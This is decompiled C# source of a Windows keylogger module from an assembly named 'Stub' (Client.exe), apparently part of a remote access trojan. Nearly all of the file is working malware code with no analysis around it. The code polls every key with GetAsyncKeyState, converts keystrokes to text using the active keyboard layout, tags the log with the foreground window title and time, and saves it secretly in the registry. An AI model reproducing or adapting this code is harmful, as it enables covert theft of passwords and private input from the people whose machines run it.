﻿// Decompiled with JetBrains decompiler
// Type: j.kl
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292CE86C-33B7-4D1B-9DE2-B41CEB9702D8
// Assembly location: C:\Users\User\Desktop\Client.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace j
{
  public class kl
  {
    private string LastAS;
    private int LastAV;
    private Keys lastKey;
    public string Logs;
    public string vn;

    public kl()
    {
      this.lastKey = Keys.None;
      this.Logs = "";
      this.vn = "[kl]";
    }

    private string AV()
    {
      try
      {
        IntPtr foregroundWindow = OK.GetForegroundWindow();
        int b;
        kl.GetWindowThreadProcessId(foregroundWindow, ref b);
        Process processById = Process.GetProcessById(b);
        if (!(foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0 | processById.MainWindowTitle.Length == 0))
        {
          this.LastAV = foregroundWindow.ToInt32();
          this.LastAS = processById.MainWindowTitle;
          return "\r\n\u0001" + DateAndTime.Now.ToString("yy/MM/dd ") + processById.ProcessName + " " + this.LastAS + "\u0001\r\n";
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return "";
    }

    private string Fix(Keys k)
    {
      bool flag = OK.F.Keyboard.ShiftKeyDown;
      if (OK.F.Keyboard.CapsLock)
        flag = !flag;
      string str1;
      string str2;
      try
      {
        Keys keys = k;
        if (keys <= Keys.End)
        {
          if (keys <= Keys.Return)
          {
            if (keys != Keys.Back)
            {
              if (keys != Keys.Tab)
              {
                if (keys == Keys.Return)
                {
                  str1 = !this.Logs.EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "";
                  goto label_28;
                }
                else
                  goto label_21;
              }
              else
              {
                str1 = "[TAP]\r\n";
                goto label_28;
              }
            }
          }
          else if ((uint) (keys - 16) > 1U)
          {
            if (keys != Keys.Space)
            {
              if (keys == Keys.End)
                goto label_17;
              else
                goto label_21;
            }
            else
            {
              str1 = " ";
              goto label_28;
            }
          }
          else
            goto label_17;
        }
        else if (keys <= Keys.RControlKey)
        {
          if (keys != Keys.Delete)
          {
            if ((uint) (keys - 112) > 11U)
            {
              switch (keys)
              {
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                  goto label_17;
                default:
                  goto label_21;
              }
            }
            else
              goto label_17;
          }
        }
        else if (keys == Keys.Shift || keys == Keys.Control || keys == Keys.Alt)
          goto label_17;
        else
          goto label_21;
        str1 = "[" + k.ToString() + "]";
        goto label_28;
label_17:
        str1 = "";
        goto label_28;
label_21:
        if (flag)
        {
          str1 = kl.VKCodeToUnicode(checked ((uint) k)).ToUpper();
          goto label_28;
        }
        else
          str2 = kl.VKCodeToUnicode(checked ((uint) k));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          string upper = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
          str1 = upper;
          ProjectData.ClearProjectError();
          goto label_28;
        }
        else
        {
          str2 = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      str1 = str2;
label_28:
      return str1;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int a);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int a);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] a);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint a, uint b);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint a,
      uint b,
      byte[] c,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder d,
      int e,
      uint f,
      IntPtr g);

    private static string VKCodeToUnicode(uint a)
    {
      try
      {
        StringBuilder d = new StringBuilder();
        byte[] numArray = new byte[(int) byte.MaxValue];
        if (!kl.GetKeyboardState(numArray))
          return "";
        uint b1 = kl.MapVirtualKey(a, 0U);
        int b2 = 0;
        IntPtr keyboardLayout = (IntPtr) kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), ref b2));
        kl.ToUnicodeEx(a, b1, numArray, d, 5, 0U, keyboardLayout);
        return d.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) a)).ToString();
    }

    public void WRK()
    {
      this.Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(this.vn, (object) "")));
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int a = 0;
          do
          {
            if (kl.GetAsyncKeyState(a) == (short) -32767 & !OK.F.Keyboard.CtrlKeyDown)
            {
              Keys k = (Keys) a;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                this.Logs += this.AV();
                this.Logs += str;
              }
              this.lastKey = k;
            }
            checked { ++a; }
          }
          while (a <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = checked (Conversions.ToInteger("20") * 1024);
            if (this.Logs.Length > num2)
              this.Logs = this.Logs.Remove(0, checked (this.Logs.Length - num2));
            OK.STV(this.vn, (object) this.Logs, RegistryValueKind.String);
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }
  }
}
